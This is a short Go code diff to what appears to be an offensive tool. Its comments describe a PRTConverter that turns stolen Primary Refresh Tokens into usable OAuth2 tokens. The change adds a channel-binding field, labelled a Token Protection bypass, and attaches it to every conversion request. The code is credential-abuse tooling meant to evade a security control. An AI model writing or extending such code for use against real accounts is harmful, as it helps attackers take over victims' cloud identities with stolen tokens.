@@ -14,6 +14,9 @@ import (
 // PRTConverter converts stolen PRTs into usable OAuth2 tokens.
 type PRTConverter struct {
 	Client *msoapx.Client
+	// Binding is the Token Protection channel binding presented on
+	// every conversion request (Token Protection bypass).
+	Binding *msoapx.ChannelBinding
 }
 
 // NewPRTConverter builds a converter around an MS-OAPX client.
@@ -82,6 +85,7 @@ func (c *PRTConverter) ConvertPRTToOAuth(ctx context.Context, prt *types.PRT, cl
 		ClientID: clientID,
 		Resource: resource,
 		PRT:      prt,
+		Binding:  c.Binding,
 	})
 }
 
